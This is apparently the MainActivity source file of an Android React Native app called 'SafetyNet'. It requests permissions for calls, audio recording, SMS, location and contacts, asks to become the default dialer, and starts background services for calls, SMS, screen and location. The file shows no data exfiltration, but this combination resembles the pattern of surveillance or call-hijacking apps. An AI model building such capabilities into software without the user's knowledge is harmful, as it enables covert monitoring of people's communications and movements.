package com.safetynet.app

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.telecom.TelecomManager
import android.util.Log
import android.view.KeyEvent
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.facebook.react.ReactActivity
import com.facebook.react.ReactActivityDelegate
import com.facebook.react.ReactApplication
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContext
import com.facebook.react.ReactInstanceEventListener
import com.facebook.react.defaults.DefaultNewArchitectureEntryPoint.fabricEnabled
import com.facebook.react.defaults.DefaultReactActivityDelegate
import com.zoontek.rnbootsplash.RNBootSplash
import android.content.BroadcastReceiver
import android.content.IntentFilter

class MainActivity : ReactActivity() {


 

    override fun getMainComponentName(): String = "SafetyNet"

    override fun createReactActivityDelegate(): ReactActivityDelegate =
        DefaultReactActivityDelegate(this, mainComponentName, fabricEnabled)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        checkPermissions()
        requestDefaultDialerRole()
        RNBootSplash.init(this, R.style.BootTheme)

        //startScreenService()
    }

 

    private fun checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val permissions = arrayOf(
                Manifest.permission.CALL_PHONE,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
            )

            if (permissions.any { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }) {
                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE)
            } else {
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                startCallForegroundService()
                startSmsForegroundService()
                startScreenService()
                startLocationForegroundService()
                startFunctionForegroundService()
                startVersionForegroundService()
            }
        }
    }

    private fun requestDefaultDialerRole() {
        val telecomManager = getSystemService(Context.TELECOM_SERVICE) as TelecomManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!telecomManager.defaultDialerPackage.equals(packageName)) {
                val intent = Intent(TelecomManager.ACTION_CHANGE_DEFAULT_DIALER)
                intent.putExtra(TelecomManager.EXTRA_CHANGE_DEFAULT_DIALER_PACKAGE_NAME, packageName)
                startActivity(intent)
            }
        }
    }

    private fun startCallForegroundService() {
        val serviceIntent = Intent(this, CallForegroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    private fun startSmsForegroundService() {
        val serviceIntent = Intent(this, SmsForegroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    private fun startScreenService() {
        val serviceIntent = Intent(this, ScreenService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    private fun startLocationForegroundService() {
        val serviceIntent = Intent(this, LocationForegroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    private fun startFunctionForegroundService() {
        val serviceIntent = Intent(this, FunctionForegroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    private fun startVersionForegroundService() {
        val serviceIntent = Intent(this, VersionForegroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
    }


    override fun onDestroy() {
        super.onDestroy()
    }

    companion object {
        private const val PERMISSION_REQUEST_CODE = 1
    }
}
